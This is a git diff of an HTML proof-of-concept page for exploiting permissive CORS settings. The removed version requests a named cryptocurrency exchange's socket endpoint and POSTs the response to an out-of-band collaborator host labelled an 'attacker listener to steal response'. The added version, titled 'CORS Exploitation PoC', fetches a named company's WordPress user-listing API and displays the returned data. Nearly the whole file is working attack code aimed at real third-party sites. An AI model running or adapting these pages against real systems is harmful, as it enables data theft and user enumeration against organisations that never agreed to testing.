@@ -1,19 +1,38 @@
-<html>
-    <head></head>
-    <body>
-        <script>
-            var xhr = new XMLHttpRequest();
-            xhr.onreadystatechange = function() {
-                if (this.readyState == 4 && this.status == 200) {
-                    var xhr2 = new XMLHttpRequest();
-                    // attacker.server: attacker listener to steal response
-                    xhr2.open("POST", "https://x64kin1o5lijsjpwwayd91ookfq6ex2m.oastify.com", true);
-                    xhr2.send(xhr.responseText);
-                }
-            };
-            // victim.site: vulnerable server with `Access-Control-Allow-Origin: *` header 
-            xhr.open("GET", "https://ws3.bitcoin.de/socket.io/1/?EIO=3&transport=polling&t=M-Q4oX6", true);
-            xhr.send();
-        </script>
-    </body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CORS Exploitation PoC</title>
+  <script>
+    window.onload = function() {
+      // Change this to the target URL that is vulnerable to open CORS
+      const vulnerableApiUrl = 'https://careers.resmed.com/wp-json/wp/v2/users'; 
+      
+      // Send a fetch request with the Origin header set to your GitHub Pages URL
+      fetch(vulnerableApiUrl, {
+        method: 'GET',
+        headers: {
+          'Origin': 'https://pangorrohammer.github.io/CORS/'
+        }
+      })
+      .then(response => response.json())
+      .then(data => {
+        // Log the response to the console
+        console.log('Exploited CORS response:', data);
+        document.getElementById('result').textContent = JSON.stringify(data);
+      })
+      .catch(error => {
+        console.error('Error during CORS request:', error);
+        document.getElementById('result').textContent = 'Error during CORS request';
+      });
+    }
+  </script>
+</head>
+<body>
+  <h1>CORS Exploitation PoC</h1>
+  <p>Click the button below to send a cross-origin request.</p>
+  <button onclick="window.location.reload();">Exploit CORS</button>
+  <pre id="result">Waiting for response...</pre>
+</body>
 </html>
